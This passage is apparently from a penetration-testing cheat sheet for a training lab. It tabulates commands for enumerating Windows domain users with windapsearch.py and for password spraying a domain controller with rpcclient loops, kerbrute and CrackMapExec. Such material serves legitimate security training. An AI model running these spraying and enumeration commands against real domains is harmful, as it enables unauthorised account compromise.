| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`              | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`. |
| ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host. |
